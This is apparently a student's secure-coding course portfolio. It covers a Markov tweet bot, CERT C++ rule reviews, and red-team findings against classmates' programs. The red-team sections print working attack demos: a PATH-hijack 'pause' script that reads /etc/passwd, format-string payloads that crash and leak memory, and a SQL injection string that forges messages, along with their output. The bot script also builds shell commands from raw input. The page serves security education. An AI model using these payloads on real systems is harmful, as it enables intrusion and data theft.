{
  "name": "Secsoft.GitHub.io",
  "tagline": "",
  "body": "# My Secure Software Milestones\r\n### Background\r\nI took this course to improve my C and C++ programming skills with a strong emphasis on secure coding practices.  This page serves as an assessment of the many new abilities I have acquired and an outline to what I have accomplished through daily challenges and inspiring projects.  It reveals the journey of hard work and dedication in producing secure software.\r\n\r\n###Classes, Structs, Templates, the STL\r\n####Summary\r\nIn [class 7](http://ss.prof.ninja/class7/), we were presented with C++ templates, classes, and vector objects and C structs.  I have always been comfortable using classes and structs and usually avoided templates and vectors.  The daily challenges in this class required that we use all of these objects.  For the first time I began to feel more confident in dealing with vector objects.\r\n\r\n### Markovian-tweets - A Twitter Bot Markov Sentence Generator \r\n#####Overview\r\nThis project was designed to test our abilities.  We were asked to develop an application that would consume a text file containing sentences and produce a tweet, using a Markov model, in the style of the input text.  If we were able to complete this task and had we skills, then we were asked to add the ability of consuming a Twitter username, extracting a sample of that person's tweets, and generating a tweet in their style.  Then, if we made it this far, we were challenged to create a bot which accepts a username and tweets a message in that user's style.\r\n#####Accomplishments\r\nWorking together with a group, we were able to complete all levels of this project.  I wanted to improve my ability to create more functional shell based applications so I requested that we develop this project constricted to the console environment such that we would not use a web browser to capture and produce tweets.  My group accepted the challenge and discovered new techniques and tools along the way.  \r\nMy first milestone was meet when I wanted to create a structure to store the words read from a text file into a Markov chain table.  Normally, I would have stored this data in a struct or class object because vector objects have always been intimidating for me.  This time; however, after our [class 7](http://ss.prof.ninja/class7/) I felt very confident with vector objects and used that to store the Markov chain table and found this method to be quite similar to python dictionary objects.\r\n\r\n```cpp\r\n   // generate Markov chain table of fixed length\r\n   map< string, vector< string > > map;\r\n\r\n   for (int i = 0; i < words.size(); i++) {\r\n     if (i < (words.size() - chain_length)) {\r\n       if (chain_length == 1)\r\n         map[words[i]].push_back(words[i+chain_length]);\r\n       if (chain_length == 2)\r\n         map[words[i]+' '+words[i+1]].push_back(words[i+chain_length]);\r\n     }\r\n   }\r\n```\r\nOnce we generated the Markov chain table, we were able to use it to produce Markovian sentences.  We added the ability for our C++ program to accept command line arguments so that we could pass parameters to our program from a shell script.  The next challange was to consume a twitter username, extract a sample of that user's tweets, and produce a tweet in their style.  To do this we used `wget` to get the id of a twitter account, `twurl` to obtain a sample of that user's tweets based on id, and our `markovchain` application to read in the tweets and produce a Markov generated tweet.  Then we added the `t` command to generate this tweet from our actual twitter account.  We put all of these commands in a ipython shell script called markovBot.ipy\r\n#####markovbot.ipy\r\n```python\r\nimport json\r\nimport sys\r\n\r\nusername = sys.argv[1]\r\nchain_length = sys.argv[2]\r\nsentence_length = sys.argv[3]\r\n\r\ncmd = 'wget \"http://mytwitterid.com/api/index.php?screen_name=' + username + '\" -O userid'\r\n!$cmd\r\n\r\nwith open('userid') as f:\r\n    data = f.read()\r\n    userid = json.loads(data)\r\n\r\nuserid = userid[0]['id']\r\n\r\ncmd = 'twurl \\\"/1.1/statuses/user_timeline.json?user_id='+userid+'&screen_name='+username+'\\\" > tweets_src'\r\n!$cmd\r\n\r\nwith open('tweets_src') as f:\r\n    data = f.read()\r\n    the_tweets = json.loads(data)\r\n    \r\ntweets = []\r\nfor data in the_tweets:\r\n    tweet = ' '.join(data['text'].split()[1:])\r\n    tweets.append(tweet)\r\ntweets = '\\n'.join(tweets).encode('utf-8')\r\n    \r\nwith open('tweets', 'w') as f:\r\n    f.write(tweets)\r\n    \r\ncmd = './markovChain tweets ' + chain_length + ' ' + sentence_length\r\nout = !$cmd\r\n\r\nprint out\r\n\r\ntweet = out[len(out)-1].strip('Sentence:')\r\n\r\ncmd = 't update \\\"' + tweet + '\\\"'\r\n!$cmd\r\n```\r\n\r\nA more detailed README and source code can be found here: [https://github.com/kkatayama/markov_tweets](https://github.com/kkatayama/markov_tweets)\r\n\r\n###Markovian-tweets (RED TEAM) - Hunt for exploits and weaknesses from the SEI CERT C Coding Standard and/or CERT C++ Coding Standard found\r\n#####Overview\r\nThis project introduced me to the CERT C++ Coding Standards.  We were asked to look at another groups Markov Sentence Generator and search for weaknesses, exploits, or proper protections that the developers used from the MEM and STR families of rules and recommendations. \r\n\r\n#####Results\r\nWe examined the source code provided by team 14 and found some good and bad practices.  The source code and initial investigation is listed below, followed by a review with respect to the CERT C++ Coding Standard.  \r\n**Please Note:** as you will see in the source code provided, this program does not actually generate a markov sentence.  This application simply prints out the first two words provided in a sample text file and then randomly prints out words.\r\n\r\n#####Source Code:\r\n```cpp\r\n#define N 2\r\n#define MAX 10000\r\n#include<iostream>\r\n#include<string>\r\n#include<deque>\r\n#include<vector>\r\n#include<map>\r\n#include<stdlib.h>\r\n#include<ctime>\r\n#include<sstream>\r\n#include<fstream>\r\n\r\nusing namespace std;\r\n\r\ntypedef deque<string> Prefix;\r\ntypedef vector<string> Postfix;\r\ntypedef map<Prefix, Postfix> mapping_table;\r\nchar fake_prefix[] = \"\\n\";\r\n\r\nvoid add_post(Prefix &pre, mapping_table &tab, const string &s)\r\n{\t\r\n\tif (pre.size() == N)\r\n\t{\r\n\t\ttab[pre].push_back(s);\r\n\t\tpre.pop_front();\r\n\t}\r\n\tpre.push_back(s);\r\n\t\r\n}\r\nvoid build_samp(Prefix &pre, mapping_table &tab, istream &in)\r\n{\r\n\tstring cur_word;\r\n\twhile (in >> cur_word)\r\n\t{\r\n\t\tadd_post(pre, tab, cur_word);\r\n\t}\r\n}\r\nvoid generate_sentence( mapping_table &tab)\r\n{\r\n\tsrand(time(NULL));\r\n\tPrefix prefix;\r\n\tfor (int i = 0; i < N; i++)\r\n\t{\r\n\t\tadd_post(prefix,tab,fake_prefix);\r\n\t}\r\n\tfor (int i = 0; i < MAX; i++)\r\n\t{\r\n\t\tPostfix cur_post = tab[prefix];\r\n\t\tconst string &w = cur_post[rand() % cur_post.size()];\r\n\t\tif (w == \"\\n\") break;\r\n\t\tcout << w<<\" \";\r\n\t\tprefix.pop_front();\r\n\t\tprefix.push_back(w);\r\n\t}\r\n\tcout << endl;\r\n}\r\nint main()\r\n{\r\n\tPrefix pre_;\r\n\tmapping_table table_;\r\n\tfor (int i = 0; i < N; i++)\r\n\t{\r\n\t\tadd_post(pre_, table_, fake_prefix);\r\n\t}\r\n\t//string sample_swntence = \"my name is SongYang, my name is LiSiqi,my name is zuiniubi\";\r\n\tstring sample_sentence;\r\n\tifstream fin(\"sample.txt\");\r\n\tif (fin)\r\n\t{\r\n\t\tgetline(fin, sample_sentence);\r\n\t}\t\r\n\telse\r\n\t{\r\n\t\tcout << \"can't find the file\";\r\n\t}\r\n\tistringstream in(sample_sentence);\r\n\tbuild_samp(pre_, table_, in);\r\n\tadd_post(pre_, table_, fake_prefix);\r\n\tgenerate_sentence(table_);\r\n\tsystem(\"pause\");\r\n\treturn 0;\r\n}\r\n```\r\n#####Vulnerabilities\r\n* system()<br />\r\n  In this markov code, there is a system function, this will cause potential secure risk.\r\nFirst, Calling \"system\" is literally like typing a command into the windows command prompt. There is a ton of setup and teardown for this application to make such a call - and the overhead is simply ridiculous.\r\n\r\n  If a program called \"pause\" was placed into the user's PATH, just calling system(\"pause\") only guarantees that a program called \"pause\" is executed.\r\n\r\n  We should simply write our own \"Pause()\" function that uses _getch. Though _getch is platform dependent as well, but it's much nicer than system() if we are developing on Windows and it has the same effect \r\n\r\n  Basically, we do not have to introduce so many potential problems while we can simply add two lines to make the same effect.\r\n\r\n  **Potential Risk:**\r\n\r\n  We can use system(“pause”) to jump to other program if we put an excutable program named “pause” under users’s path.\r\n  \r\n  So we decided to see if we could produce an exploit without modifying their code.  We simply created a file called ‘pause’ and added the following lines\r\n\r\n  ```cpp\r\n\t/bin/echo '\\n'\r\n\t/bin/cat /etc/passwd | egrep -v '_|#'\r\n  ```\r\n  \r\n  ```cpp\r\n  $ ./main\r\n  my name is LiSiqi,my name is LiSiqi,my name is LiSiqi,my name is LiSiqi,my name is zuiniubi\r\n\r\n\r\n  nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\r\n  root:*:0:0:System Administrator:/var/root:/bin/sh\r\n  daemon:*:1:1:System Services:/var/root:/usr/bin/false\r\n  ```\r\n* rand()<br />\r\n  The `rand()` function in C++ generates lower random number much more likely than large numbers, this will cause the program lose some randomness.\r\n\r\n  Besides,  this function is not sufficiently random for security-related functions such as key and nonce creation.\r\n\r\n#####SEI CERT C++ Coding Standard\r\n\r\n* Violations:\r\n\r\n  FIO51-CPP -  Close files when they are no longer needed they open the ‘sample.txt’ file using ifstream but never close (terminate) it\r\n\r\n  DCL52-CPP - Never qualify a reference type with const or volatile\r\n  line 45: `const string &w = cur_post[rand() % cur_post.size()];`\r\n\r\n  This noncompliant code example correctly declares w to be a reference to a const-qualified char. The subsequent modification of w makes the program ill-formed and may result in undefined behavior instead of a fatal diagnostic, causing unexpected values to be stored and leading to possible data integrity violations.\r\n‘const’ should be removed\r\n\r\n  ENV02-CPP - Do not call system() if you do not need a command processor\r\nline 76: `system(\"pause\");`\r\nAs shown in our investigation above, we were able to execute unintended shell code without modifying the source code\r\n\r\n* Good Practice:\r\n\r\n  DCL51-CPP - Do not declare or define a reserved identifier\r\n  DCL51-CPP-EX1: For compatibility with other compiler vendors or language standard modes, it is acceptable to create a macro identifier that is the same as a reserved identifier so long as the behavior is semantically identical\r\n  line 1: `#define N 2`\r\n  line 2: `#define MAX 10000`\r\n\r\n  DCL52-CPP - Never qualify a reference type with const or volatile\r\n  line 7: `void add_post(Prefix &pre, mapping_table &tab, const string &s)`\r\n  here s is a const that is never modified in this function - correct usage\r\n\r\n### Command-Line Minesweeper\r\n#####Overview\r\nThis project had two parts.  The first part was to create a console based Minesweeper game that would display a game board and accept user input for a coordinate where they could predict a mine does not exist.  If a mine was at that coordinate, then the game would exit, otherwise adjacent squares would be uncovered.  We were then asked to compare our code with ARR and EXP CERT rules.  For extra points we could add the ability to flag mines.  The second part involved exchanging our Minesweeper code with that of another group and document applications and violations of CERT rules in mSC and DCL.\r\n\r\n#####Accomplishments\r\nFor part 1, our group was not only able to complete a functioning Minesweeper game, but also added the ability to flag mines.\r\n\r\nFor part 2, this is the outcome of our head to head competition:\r\n\r\n####Our Team Code\r\n[https://github.com/alparslansari/minesweeper-nogui](https://github.com/alparslansari/minesweeper-nogui)\r\n\r\n####Our Team Score Calculation (180 pts)\r\n#####MSC POINTS\r\n* \t(+20pts) MSC50-CPP. Do not use std::rand() for generating pseudorandom numbers\r\n\tOur team uses srand() so we are compliant\r\n\t```cpp\r\n\tsrand(time(0));\r\n\t```\r\n* \t(+20pts) MSC51-CPP. Ensure your random number generator is properly seeded\r\n\tOur code adjusts seed based on size of limit\r\n\t```cpp\r\n\tint rnd = 1 + rand() % limit;\r\n\t```\r\n* \t(+20pts) MSC52-CPP. Value-returning functions must return a value from all exit paths\r\n\tOur functions return a value from all exit paths\r\n\r\n* \t(0pts) MSC53-CPP. Do not return from a function declared [[noreturn]]\r\n\tOur code does not use functions decared [[noreturn]], therefore we are compliant\r\n\r\n#####DCL POINTS\r\n* \t(+20pts) DCL50-CPP. Do not define a C-style variadic function\r\n\tOur code does not define a C-style variadic function\r\n\r\n* \t(+20pts) DCL51-CPP. Do not declare or define a reserved identifier\r\n\tCompliant Header Guard\r\n\t\r\n\t```cpp\r\n\t#ifndef VALIDATION_H\r\n\t#define VALIDATION_H\r\n\t```\r\n* \t(+20pts) DCL52-CPP. Never qualify a reference type with const or volatile\r\n\t\r\n\t```cpp\r\n\tint const Validation::MAX_WIDTH=100;\r\n\tint const Validation::MAX_HEIGHT=40;\r\n\t```\r\n* \t(+20pts) DCL56-CPP. Avoid cycles during initialization of static objects\r\n\tOur code initializes variables\r\n\t\r\n\t```cpp\r\n\t// initialize the board;\r\n   \tfor(int i = 1; i<=height; i++)\r\n      for(int j = 1; j<=width; j++)\r\n      {\r\n         board[i][j] = -1; // empty squares\r\n         boardMarkings[i][j] = -1; // \r\n      }\r\n\t```\r\n* \t(+20pts) DCL58-CPP. Do not modify the standard namespaces\r\n\tOur code does not modify standard namespaces\r\n\t\r\n\t```cpp\r\n\tusing namespace std;\r\n\t```\r\n* \t(0pts) DCL59-CPP. Do not define an unnamed namespace in a header file\r\n\tOur code does not include a header file so this is satisfied\r\n\r\n* \t(+20pts) DCL60-CPP. Obey the One-Definition Rule\r\n\tOur code does not have multiple definitions with the same name\r\n\r\n\t```cpp\r\n\tclass Validation {\r\n   public:\r\n   \t  static int const MAX_WIDTH;\r\n   \t  static int const MAX_HEIGHT;\r\n   \t  bool isValidWidth(int width);\r\n   \t  bool isValidHeight(int height);\r\n   \t  bool isValidNumOfMines(int width, int height, int mines);\r\n      void printIntro();\r\n      int isValidateParamINT(std::string param);\r\n      int isCoordParamINT(std::string param);\r\n      bool isCoordinatesValid(std::string x, std::string y, int width, int \theight);\r\n\t};\r\n\t```\r\n\r\n####Opponent Code\r\n[https://github.com/samkossey/project_3_blue.git](https://github.com/samkossey/project_3_blue.git)\r\n\r\n####Opponent Score Calculation (140 pts)\r\n#####MSC POINTS\r\n* \t(+20pts) MSC50-CPP. Do not use std::rand() for generating pseudorandom numbers\r\n\tcode does not use rand() function\r\n\t\r\n\t```cpp\r\n\tsrand(time(NULL));\r\n\t```\r\n* \t(+20pts) MSC51-CPP. Ensure your random number generator is properly seeded\r\n\tcode generates number of pseudorandom numbers based on board size\r\n\t\r\n\t```cpp\r\n\tsrand(time(NULL));\r\n    int bombsDropped=0;\r\n    //drops bombs in order on board until no more remain\r\n    for(int i = 0 ; i < width; i++){\r\n        for (int j = 0; j < height; j++){\r\n            if(bombsDropped < bombs){\r\n                if (!(i == x && j == y)){\r\n                    aBoard[i][j].Bomb();\r\n                    bombsDropped++;\r\n                }\r\n            } else {\r\n                break;\r\n            }\r\n        }\r\n        if(bombsDropped > bombs){\r\n            break;\r\n        }\r\n    }\r\n\t```\r\n* \t(+20pts) MSC52-CPP. Value-returning functions must return a value from all exit paths\r\n\tTheir code returns a value from all exit paths\r\n\t\r\n#####DCL POINTS\r\n* \t(+20pts) DCL57-CPP. Do not let exceptions escape from destructors or deallocation functions\r\n\tTheir code has an explicit return statement to handle exceptions properly\r\n\t\r\n\t```cpp\r\n\t} catch (invalid_argument const &e){\r\n        cout << \"Argument Error: \" << e.what() << endl;\r\n        return 1;\r\n    } catch (bad_alloc const &e){\r\n        cout << \"Memory Error: \" << e.what() << endl;\r\n        return 2;\r\n    } catch (runtime_error const &e){\r\n        cout << \"Runtime Error: \" << e.what() << endl;\r\n        return 3;\r\n    } catch (exception const &e){\r\n        cout << \"Other Error: \" << e.what() << endl;\r\n        return 4;\r\n    }\r\n\t```\r\n* \t(+20pts) DCL50-CPP. Do not define a C-style variadic function\r\n\tTheir code does not define C-style variadic functions\r\n\r\n* \t(+20pts) DCL58-CPP. Do not modify the standard namespaces\r\n\tTheir code does not modify standard namespaces\r\n\t\r\n\t```cpp\r\n\tusing namespace std;\r\n\t```\r\n* \t(0pts) DCL59-CPP. Do not define an unnamed namespace in a header file\r\n\tTheir code does not include a header file so this is satisfied\r\n\r\n* \t(+20pts) DCL60-CPP. Obey the One-Definition Rule\r\n\tTheir code does not have multiple definitions with the same name\r\n\t\r\n\t```cpp\r\nstruct Spot{\r\n    int value;\r\n    bool isBomb;\r\n    bool isRevealed;\r\n    bool isFlagged;\r\n    Spot(){\r\n        isBomb = false;\r\n        isRevealed = false;\r\n        isFlagged = false;\r\n        value = 0;\r\n    };\r\n    ~Spot(){};\r\n    \r\n    bool Click(bool flag){\r\n        //a regular click\r\n        if(!flag && !isFlagged){ //click it, click it good\r\n        isRevealed = true;\r\n        return isBomb;\r\n        }\r\n        //a flag click\r\n        if(flag){\r\n            isFlagged = !isFlagged;  //toggle flag\r\n            return false;\r\n        }\r\n    }\r\n    //sets bomb to true\r\n    void Bomb(){\r\n        isBomb = true;\r\n    }\r\n    \r\n\t};\r\n\t```\r\n\r\n\r\n### Gee-Mail - a secure asynchronous message platform\r\n#####Overview\r\nThis project had two parts, the first part was to create a secure asynchronous message platform that would prompt the user to sign-in or register a new account.  When logging in, the password is to be validated and if login fails, an appropriate response would be generated.  Once logged in, that user will be presented with the number of messages they have along with a list of the users that sent them a message.  Then the user will be prompted to read or write a message.  When writing a message, the user would be prompted for the receipients username, the message, and a shared passphrase.  When the user reads a message, the user will be prompted to enter the passphrase before showing the message in plaintext.  The second part involved exchanging our Gee-Mail application with that of another group and document exploit vulnerabilities and violations of all CERT rules\r\n\r\n#####Accomplishments\r\nNot only were we able to deliver a fully functional Gee-Mail application, we also added the ability to delete messages, preset all messages with read or not read status, and deploy our application to a web server under two different methods.  A detailed summary of our api can be seen here: [https://github.com/kkatayama/Gee-Mail](https://github.com/kkatayama/Gee-Mail).  Our working web connector code can be seen here: [https://github.com/alparslansari/gee-web-mail](https://github.com/alparslansari/gee-web-mail).  As for part 2, we found several vulnerabilities and were able to exploit them.  Below is our results.\r\n\r\n###Unintended behaviors with normal inputs \r\n> ###Design Flaw: All users have access to other user's emails\r\nIf you log in as a normal user and select to read an email you will be preseneted with the number of emails that exist in the database and asked to enter an email id.  This id is the actual id stored in the database so a user could enter an id that belongs to an email of another user and attempt to read it.  Here we log in as `teddy` and attempt to read an email sent from `alp` to `kevin`!\r\n> \r\n> ```bash\r\n> $ ./geemail\r\n> Please enter 0 for register or 1 for login: 1\r\nPlease enter your username: teddy\r\nPlease enter your password: password\r\nYou logged in successfully!\r\nID = 1\r\nSENDER = alp\r\nTITLE = Hello Teddy\r\n\r\n>Number of Emails: 3\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 1\r\nPlease enter an email id: 2\r\nPlease enter a secret passphrase: secret\r\nYour message: Hello Alp, this is Kevin!\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 2\r\n> ```\r\n>###Program sends unintended corrupted email, creates unintended user, and crashes when input is a character\r\nWhen you run the program, if you input any character as your choice, the program will create a blank user into the database and send a corrputed email.  If you try this a second time, the program will get stuck in a loop trying to create this blank user until it crashes.  To demo this we use the character `a`\r\n \r\n> ####First Run\r\n> ```bash\r\n> $ ./geemail\r\n>Please enter 0 for register or 1 for login: a\r\nPlease enter a new username: Please enter your password: Number of Emails: 0\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message \r\nYour Message: \r\nMessage Sent :)\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter an email id: Please enter a secret passphrase: Your message: \r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: #\r\n> ```\r\n> ####Database shows new user created and corrupted email sent `id = 4`\r\n> ```sql\r\n> sqlite> select * from emails; select * from users;\r\n1|teddy|alp|Hello Teddy|F2C6108389DAF19A54250A255A03A81522917E84F3D3BC4CEF\r\n2|alp|kevin|Hello Alp|F2C6108389DAE493406D537D121EB35C38C237BCB6E4B952EF\r\n3|kevin|teddy|Hello Kevin|F2CA5C84838CCC911C611B660D57A10E34916E98A6ADF54CEB68E7EB68DAC1DFE906\r\n4||||P\u001C�\r\n1|teddy|5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8\r\n2|alp|5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8\r\n3|kevin|5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8\r\n4||E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855\r\n> ```\r\n> ####Second Run\r\n> ```bash\r\n> $ ./geemail\r\n>Please enter 0 for register or 1 for login: a\r\nPlease enter a new username: User already exists. Try again.\r\nPlease enter a new username: User already exists. Try again.\r\nPlease enter a new username: User already exists. Try again.\r\n...\r\n\r\n>Program received signal SIGSEGV, Segmentation fault.\r\n> 0x00007fff8b91733b in unixOpen () from /usr/lib/libsqlite3.dylib\r\n> ```\r\n\r\n\r\n###Program is vulnerable to string format exploit\r\n>###Program crash after attempting to modify object after being freed\r\nIf you log in as a normal user and select to read an email but use C format strings in the passphrase input, the program attempts to modify the object after being freed\r\n> \r\n> ####Input\r\n> ```bash\r\n> $ ./geemail\r\n> Please enter 0 for register or 1 for login: 1\r\nPlease enter your username: teddy\r\nPlease enter your password: password\r\nYou logged in successfully!\r\nID = 1\r\nSENDER = alp\r\nTITLE = Hello Teddy\r\n\r\n>Number of Emails: 3\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 1\r\nPlease enter an email id: 1\r\nPlease enter a secret passphrase: %x%p%x%n%p%p%p%p\r\n>```\r\n> ####osx Output\r\n> ```bash\r\nPlease enter a secret passphrase: %x%p%x%n%p%p%p%p\r\ngeemail(48247,0x7fff7b3b1000) malloc: *** error for object 0x7feb63403220: incorrect checksum for freed object - object was probably modified \tafter being freed.\r\n*** set a breakpoint in malloc_error_break to debug\r\n[1]    48247 abort      ./geemail\r\n> ```\r\n> ####cloud9 output\r\n> ```bash\r\n> Please enter a secret passphrase: %x%p%x%n%p%p%p%p\r\n> *** Error in `./geemail': free(): invalid next size (fast): 0x00000000006db7e0 ***\r\nAborted\r\n> ```\r\n>###Program leaks memory and sends massive spam emails after reading email containing string format variables\r\nIf you log in as a normal user and send an email that contains string format variables, when any user reads that email, data can be leaked and massive spam emails could be sent.  For this demo we use this as our string format test `%p%p%p%p%p%n`.\r\n> \r\n> ```bash\r\n> $ ./geemail\r\n> Please enter 0 for register or 1 for login: 1\r\nPlease enter your username: teddy\r\nPlease enter your password: password\r\nYou logged in successfully!\r\nID = 1\r\nSENDER = alp\r\nTITLE = Hello Teddy\r\n\r\n>Number of Emails: 3\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 0\r\nPlease enter your recipient: teddy\r\nPlease enter your title: %p%p%p%p%p%n %p%p%p%p%p%n\r\nPlease enter your secret passphrase: secret\r\nEnter the message\r\nhello %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n\r\nYour Message: hello %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n\r\nMessage Sent :)\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 2\r\n\r\n>$ ./geemail\r\n> Please enter 0 for register or 1 for login: 1\r\nPlease enter your username: teddy\r\nPlease enter your password: password\r\nYou logged in successfully!\r\nID = 1\r\nSENDER = alp\r\nTITLE = Hello Teddy\r\n\r\n>Number of Emails: 3\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 1\r\nPlease enter an email id: 49\r\nPlease enter a secret passphrase: secret\r\nYour message: hello %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%ngmail.db\r\n>```\r\n\r\n>Here we can see **gmail.db** is revealed which is the actual name for the database file.  Each run may reveal other informaion, such as the current directory of the application, etc.  At this point, the application is in a state that can't process the string format variables properly.  If you input any character when asked to `read, write, or quit`, that user will send massive spam emails until memory is exhausted and program crashes.  The database file increases in size quite quickly.\r\n> \r\n> ```bash\r\n> Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: a\r\nPlease enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message\r\nYour Message:\r\nMessage Sent :)\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter an email id: Please enter a secret passp��hǱ�]`:Z�#��essage: \\^k\r\n             b!é��M�|�(�ްb��!�H:R߅�]l Ԏ�\r\n                                       �ٶe��G��r@&�@�+�\\���\\Jgmail.db\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message\r\nYour Message:\r\nMessage Sent :)\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter an email id: Please enter a secret passp��hǱ�]`:Z�#��essage: \\^k\r\n             b!é��M�|�(�ްb��!�H:R߅�]l Ԏ�\r\n                                       �ٶe��G��r@&�@�+�\\���\\J\r\nMessage Sent :)\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message\r\nYour Message:\r\ngeemail(83110,0x7fff7b3b1000) malloc: *** error for object 0x103001560: incorrect checksum for freed object - object was probably modified after being freed.\r\n*** set a breakpoint in malloc_error_break to debug\r\n[New Thread 0x3583 of process 83110]\r\n\r\n>Thread 1 received signal SIGABRT, Aborted.\r\n0x00007fff9fbb4f06 in __pthread_kill () from /usr/lib/system/libsystem_kernel.dylib\r\n$\r\n> ```\r\n>   Now if we look at the database, we will see over 10,000 emails were sent and stored with corrupted data:\r\n> \r\n>```sql\r\n>select * from emails;\r\n>...\r\n>12306||teddy||�m�\u0002\r\n12307||teddy||���\u0002\r\n12308||teddy||���\u0002\r\n12309||teddy||���\u0002\r\n12310||teddy||�@�\u0002\r\n>```\r\n\r\n###Progarm is vulnerable to SQL injection\r\n> ####All queries use quotations around variables\r\nAn example of this is seen on line 425:\r\n>\r\n> ```cpp\r\n> string query = \"INSERT INTO EMAILS (RECIPIENT, SENDER, TITLE, MESSAGE) VALUES ('\" + recip + \"', '\" + username + \"', '\" + title + \"', '\" + decryptedMess + \"');\";\r\n> ```\r\n>\r\n>   In this example we will log in as `teddy` and send an email to `kevin` from `alp`.  We will send the message `Hello kevin, this is alp... but is this really alp?` encrypted with salsa20 using the IV of `AAAAAAAA` and passphrase `secret`.  The application does not randomize the IV and uses `AAAAAAAA`.\r\n> \r\n> ```sql\r\n$ ./geemail\r\nPlease enter 0 for register or 1 for login: 1\r\nPlease enter your username: teddy\r\nPlease enter your password: password\r\nYou logged in successfully!\r\nID = 1\r\nSENDER = alp\r\nTITLE = Hello Teddy\r\n>\r\nNumber of Emails: 3\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 0\r\nPlease enter your recipient: teddy teddy',''); SELECT * FROM emails; INSERT INTO emails (RECIPIENT, SENDER, TITLE, MESSAGE) VALUES (\"kevin\",\"alp\",\"hello kevin\",\"F2C6108389DACE9A46281D255A03A81522917E84F3F3BC4CE036ECBB2FDF908FA51B5566F68ED16764E2A2FC94622345BD1641\"); SELECT * FROM emails;--\r\nPlease enter your title: Please enter your secret passphrase: blah blah\r\nEnter the message\r\nYour Message: blah\r\nID = 1\r\nRECIPIENT = teddy\r\nSENDER = alp\r\nTITLE = Hello Teddy\r\nMESSAGE = F2C6108389DAF19A54250A255A03A81522917E84F3D3BC4CEF\r\n>\r\nID = 2\r\nRECIPIENT = alp\r\nSENDER = kevin\r\nTITLE = Hello Alp\r\nMESSAGE = F2C6108389DAE493406D537D121EB35C38C237BCB6E4B952EF\r\n>\r\nID = 3\r\nRECIPIENT = kevin\r\nSENDER = teddy\r\nTITLE = Hello Kevin\r\nMESSAGE = F2CA5C84838CCC911C611B660D57A10E34916E98A6ADF54CEB68E7EB68DAC1DFE906\r\n>\r\nID = 4\r\nRECIPIENT = teddy\r\nSENDER = teddy\r\nTITLE = teddy\r\nMESSAGE =\r\n>\r\nID = 1\r\nRECIPIENT = teddy\r\nSENDER = alp\r\nTITLE = Hello Teddy\r\nMESSAGE = F2C6108389DAF19A54250A255A03A81522917E84F3D3BC4CEF\r\n>\r\nID = 2\r\nRECIPIENT = alp\r\nSENDER = kevin\r\nTITLE = Hello Alp\r\nMESSAGE = F2C6108389DAE493406D537D121EB35C38C237BCB6E4B952EF\r\n>\r\nID = 3\r\nRECIPIENT = kevin\r\nSENDER = teddy\r\nTITLE = Hello Kevin\r\nMESSAGE = F2CA5C84838CCC911C611B660D57A10E34916E98A6ADF54CEB68E7EB68DAC1DFE906\r\n>\r\nID = 4\r\nRECIPIENT = teddy\r\nSENDER = teddy\r\nTITLE = teddy\r\nMESSAGE =\r\n>\r\nID = 5\r\nRECIPIENT = kevin\r\nSENDER = alp\r\nTITLE = hello kevin\r\nMESSAGE = F2C6108389DACE9A46281D255A03A81522917E84F3F3BC4CE036ECBB2FDF908FA51B5566F68ED16764E2A2FC94622345BD1641\r\n>\r\nMessage Sent :)\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 2\r\n$\r\n```\r\n>\r\n>  If successful, then `kevin` should be able to log in and see a new message from `alp`.  Logging in as `kevin` this is what we saw :)\r\n> \r\n>```bash\r\n$ ./geemail\r\nPlease enter 0 for register or 1 for login: 1\r\nPlease enter your username: kevin\r\nPlease enter your password: password\r\nYou logged in successfully!\r\nID = 5\r\nSENDER = alp\r\nTITLE = hello kevin\r\n>\r\nID = 3\r\nSENDER = teddy\r\nTITLE = Hello Kevin\r\n>\r\nNumber of Emails: 3\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 1\r\nPlease enter an email id: 5\r\nPlease enter a secret passphrase: secret\r\nYour message: Hello kevin, this is alp... but is this really alp?\r\nPlease enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 2\r\n$\r\n> ```\r\n \r\n###CERT Rule Recommendations\r\n> * MEM31-C. Free dynamically allocated memory when no longer needed\r\n> \r\n>```bash\r\n\tchar * returnBuffer = (char *) malloc(txtLength*2);\r\n>\r\n    memset(returnBuffer, 0, txtLength*2);\r\n    for (index = 0; index<txtLength; index++) {\r\n        sprintf(returnBuffer + index*2, \"%02X\", (unsigned char)encBuffer[index]);\r\n    }\r\n    string result(returnBuffer);\r\n    free(encBuffer);\r\n    return result;\r\n>```\r\n> \r\n>    From line 199 to 207, they allocated returnBuffer but forgot free it.\r\n\r\n> * STR31-C. Guarantee that storage for strings has sufficient space for character data and the null terminator\r\n> \r\n>```bash\r\n\tfor (index = 0; 